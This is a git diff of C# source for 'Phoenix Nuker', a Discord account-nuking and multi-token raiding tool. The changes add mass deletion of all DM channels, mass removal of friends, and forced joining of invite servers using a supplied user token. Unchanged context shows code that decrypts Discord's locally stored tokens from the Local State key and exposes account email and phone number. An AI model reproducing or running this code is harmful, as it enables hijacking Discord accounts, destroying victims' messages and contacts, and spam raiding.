@@ -19,6 +19,9 @@ using Org.BouncyCastle.Crypto.Engines;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Collections.Generic;
+using Newtonsoft.Json.Linq;
+using System.Collections.Specialized;
+using System.Net.Http.Headers;
 
 /* 
        │ Author       : extatent
@@ -32,6 +35,7 @@ namespace nuker
     {
         #region Configs
         public static string version = "4";
+        public static string APIVersion = "10";
         public static string token;
         public static int WaitTimeShort = 200;
         public static int WaitTimeLong = 2000;
@@ -163,105 +167,114 @@ namespace nuker
 
             GetConfig();
 
-            Console.WriteLine("{0,-20} {1,34}", "[1] Login with user token", "[2] Login with your token");
-            Console.WriteLine("{0,-20} {1,21}", "[3] MultiToken Raider", "[4] Exit");
-
-            Console.WriteLine();
-            Console.Write("Your choice: ");
-            int options = int.Parse(Console.ReadLine());
-            switch (options)
+            try
             {
-                default:
-                    Console.WriteLine("Not a valid option.");
-                    DoneMethod4();
-                    break;
-                case 1:
-                    if (string.IsNullOrEmpty(token))
-                    {
+                Console.WriteLine("{0,-20} {1,34}", "[1] Login with user token", "[2] Login with your token");
+                Console.WriteLine("{0,-20} {1,21}", "[3] MultiToken Raider", "[4] Exit");
+
+                Console.WriteLine();
+                Console.Write("Your choice: ");
+                int options = int.Parse(Console.ReadLine());
+                switch (options)
+                {
+                    default:
+                        Console.WriteLine("Not a valid option.");
+                        DoneMethod4();
+                        break;
+                    case 1:
+                        if (string.IsNullOrEmpty(token))
+                        {
+                            try
+                            {
+                                Console.Clear();
+                                WriteLogo();
+                                Console.Write("Token: ");
+                                string token = Console.ReadLine();
+
+                                if (token.Contains("\""))
+                                {
+                                    token = token.Replace("\"", "");
+                                }
+
+                                SaveConfig(token);
+
+                                client.Login(token);
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine(ex.Message);
+                                Thread.Sleep(WaitTimeLong);
+                                if (File.Exists("config.json"))
+                                {
+                                    File.Delete("config.json");
+                                }
+                                Start();
+                            }
+                        }
+                        else
+                        {
+                            try
+                            {
+                                client.Login(token);
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine(ex.Message);
+                                Thread.Sleep(WaitTimeLong);
+                                if (File.Exists("config.json"))
+                                {
+                                    File.Delete("config.json");
+                                }
+                                Start();
+                            }
+                        }
+                        break;
+                    case 2:
                         try
+                        {
+                            client.Login(GetToken());
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine(ex.Message);
+                            Thread.Sleep(WaitTimeLong);
+                            Start();
+                        }
+                        break;
+                    case 3:
+                        var TokenList = File.ReadAllLines("tokens.txt");
+
+                        int count = 0;
+
+                        foreach (var token in TokenList)
+                        {
+                            count++;
+
+                            DiscordClient client = new DiscordClient(token);
+
+                            clients.Add(client);
+                        }
+                        if (count == 0)
                         {
                             Console.Clear();
                             WriteLogo();
-                            Console.Write("Token: ");
-                            string token = Console.ReadLine();
-
-                            if (token.Contains("\""))
-                            {
-                                token = token.Replace("\"", "");
-                            }
-
-                            SaveConfig(token);
-
-                            client.Login(token);
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine(ex.Message);
+                            Console.WriteLine("Paste your tokens in tokens.txt file.");
                             Thread.Sleep(WaitTimeLong);
-                            if (File.Exists("config.json"))
-                            {
-                                File.Delete("config.json");
-                            }
                             Start();
                         }
-                    }
-                    else
-                    {
-                        try
-                        {
-                            client.Login(token);
-                        }
-                        catch (Exception ex)
-                        {
-                            Console.WriteLine(ex.Message);
-                            Thread.Sleep(WaitTimeLong);
-                            if (File.Exists("config.json"))
-                            {
-                                File.Delete("config.json");
-                            }
-                            Start();
-                        }
-                    }
-                    break;
-                case 2:
-                    try
-                    {
-                        client.Login(GetToken());
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine(ex.Message);
-                        Thread.Sleep(WaitTimeLong);
-                        Start();
-                    }
-                    break;
-                case 3:
-                    var TokenList = File.ReadAllLines("tokens.txt");
-
-                    int count = 0;
-
-                    foreach (var token in TokenList)
-                    {
-                        count++;
-
-                        DiscordClient client = new DiscordClient(token);
-
-                        clients.Add(client);
-                    }
-                    if (count == 0)
-                    {
-                        Console.Clear();
-                        WriteLogo();
-                        Console.WriteLine("Paste your tokens in tokens.txt file.");
-                        Thread.Sleep(WaitTimeLong);
-                        Start();
-                    }
-                    Console.Title = "Phoenix Nuker | Total Accounts: " + count;
-                    Raider();
-                    break;
-                case 4:
-                    Environment.Exit(0);
-                    break;
+                        Console.Title = "Phoenix Nuker | Total Accounts: " + count;
+                        Raider();
+                        break;
+                    case 4:
+                        Environment.Exit(0);
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Thread.Sleep(WaitTimeLong);
+                Start();
             }
 
             WriteLogo();
@@ -872,8 +885,8 @@ namespace nuker
             Console.WriteLine("{0,-20} {1,25}", "[7] Mass Create Guilds", "[8] Seizure Mode");
             Console.WriteLine("{0,-20} {1,23}", "[9] Confuse Mode", "[10] Mass DM");
             Console.WriteLine("{0,-20} {1,35}", "[11] User Info", "[12] Block Relationships");
-            Console.WriteLine("{0,-20} {1,23}", "[13] Nitro Sniper", "[14] Go Back");
-            Console.WriteLine("[15] Exit");
+            Console.WriteLine("{0,-20} {1,26}", "[13] Nitro Sniper", "[14] Delete DMs");
+            Console.WriteLine("{0,-20} {1,20}", "[15] Go Back", "[16] Exit");
 
             Console.WriteLine();
             Console.Write("Your choice: ");
@@ -895,6 +908,8 @@ namespace nuker
                             {
                                 req.AddHeader("Authorization", token);
                                 req.Post("https://discord.com/api/v10/invites/terraria");
+                                req.Post("https://discord.com/api/v10/invites/phasmophobia");
+                                req.Post("https://discord.com/api/v10/invites/brackeys");
                             }
                         }
                     }
@@ -921,16 +936,28 @@ namespace nuker
                     DoneMethod();
                     break;
                 case 3:
-                    foreach (var relationship in client.GetRelationships())
+                    try
                     {
-                        try
+                        Console.Clear();
+                        WriteLogo();
+
+                        using (HttpRequest req = new HttpRequest())
                         {
-                            relationship.Remove();
-                            Thread.Sleep(WaitTimeShort);
+                            req.AddHeader("Authorization", token);
+                            HttpResponse channelid = req.Get("https://discord.com/api/v" + APIVersion + "/users/@me/relationships");
+                            var array = JArray.Parse(channelid.ToString());
+                            req.Close();
+                            foreach (dynamic entry in array)
+                            {
+                                req.AddHeader("Authorization", token);
+                                req.Delete("https://discord.com/api/v" + APIVersion + "/users/@me/relationships/" + entry.id);
+                                Console.WriteLine("Removed: " + entry.user.username + "#" + entry.user.discriminator);
+                                Thread.Sleep(WaitTimeShort);
+                            }
                         }
-                        catch
-                        { }
                     }
+                    catch
+                    { }
                     DoneMethod();
                     break;
                 case 4:
@@ -1083,7 +1110,6 @@ namespace nuker
                         Console.WriteLine("ID: " + client.GetClientUser().Id + "\nEmail: " + client.GetClientUser().Email + "\nPhone number: " + client.GetClientUser().PhoneNumber  + "\nRegistered at: " + client.GetClientUser().CreatedAt + "\nRegistration language: " + client.GetClientUser().RegistrationLanguage + "\nGuilds count: " + client.GetCachedGuilds().Count + "\nFriends count: " + client.GetRelationships().Count + "\nDMs count: " + client.GetPrivateChannels().Count + "\nBadges: " + client.GetClientUser().Badges);
                         Console.WriteLine("\nPress any key to go back.");
                         Console.ReadKey();
-                        Thread.Sleep(WaitTimeLong);
                         Console.Clear();
                         AccountNuker();
                     }
@@ -1112,9 +1138,31 @@ namespace nuker
                     Environment.Exit(0);
                     break;
                 case 14:
-                    Start();
+                    try
+                    {
+                        using (HttpRequest req = new HttpRequest())
+                        {
+                            req.AddHeader("Authorization", token);
+                            HttpResponse channelid = req.Get("https://discord.com/api/v" + APIVersion + "/users/@me/channels");
+                            var array = JArray.Parse(channelid.ToString());
+                            req.Close();
+                            foreach (dynamic entry in array)
+                            {
+                                req.AddHeader("Authorization", token);
+                                req.Delete("https://discord.com/api/v" + APIVersion + "/channels/" + entry.id);
+                                Console.WriteLine("Deleted: " + entry.recipients[0].username + "#" + entry.recipients[0].discriminator);
+                                Thread.Sleep(WaitTimeShort);
+                            }
+                        }
+                    }
+                    catch
+                    { }
+                    DoneMethod();
                     break;
                 case 15:
+                    Start();
+                    break;
+                case 16:
                     Environment.Exit(0);
                     break;
             }
@@ -1461,7 +1509,7 @@ namespace nuker
             return token;
         }
 
-        static byte[] DecryptKey(string path)
+        static byte[] DecyrptKey(string path)
         {
             dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
             return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
@@ -1470,7 +1518,7 @@ namespace nuker
         static string DecryptToken(byte[] buffer)
         {
             byte[] EncryptedData = buffer.Skip(15).ToArray();
-            AeadParameters Params = new AeadParameters(new KeyParameter(DecryptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
+            AeadParameters Params = new AeadParameters(new KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
             GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
             BlockCipher.Init(false, Params);
             byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
